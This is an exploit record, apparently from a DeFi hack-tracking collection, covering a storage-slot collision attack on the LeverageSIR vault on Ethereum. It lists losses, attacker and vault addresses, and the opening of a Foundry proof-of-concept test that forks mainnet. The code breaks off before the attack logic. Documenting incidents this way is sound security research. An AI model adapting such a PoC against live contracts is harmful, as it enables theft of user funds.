# [?] LeverageSIR - Storage SLOT1 collision

## Summary
Severity: Unknown
Chain: Ethereum
Component: LeverageSIR
Published: 2025-03-30
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/LeverageSIR_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~ 353.8 K (17814,86 USDC, 1,4085 WBTC, 119,87 WETH)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 353.8 K (17814,86 USDC, 1,4085 WBTC, 119,87 WETH)
// Original Attacker : https://etherscan.io/address/0x27defcfa6498f957918f407ed8a58eba2884768c
// Attack Contract(Main) : https://etherscan.io/address/0xea55fffae1937e47eba2d854ab7bd29a9cc29170
// Attack Contract(Dumb Token) : https://etherscan.io/address/0x341c853c09b3691b434781078572f9d3ab9e3cbb
// Attack Contract(Create2 Deployed) : https://etherscan.io/address/0x00000000001271551295307acc16ba1e7e0d4281
// Vulnerable Contract : https://etherscan.io/address/0xb91ae2c8365fd45030aba84a4666c4db074e53e7
// Attack Tx : https://etherscan.io/tx/0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f
// @POC Author : [rotcivegaf](https://twitter.com/rotcivegaf)

// Contracts involved
address constant vault = 0xB91AE2c8365FD45030abA84a4666C4dB074E53E7;

address constant uniV3PositionsNFT = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
address constant uniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant immutableCreate2Factory = 0x0000000000FFe8B47B3e2130213B802212439497;

address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant wbtc = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

contract LeverageSIR_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("mainnet", 22_157_900 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/LeverageSIR_exp.sol_
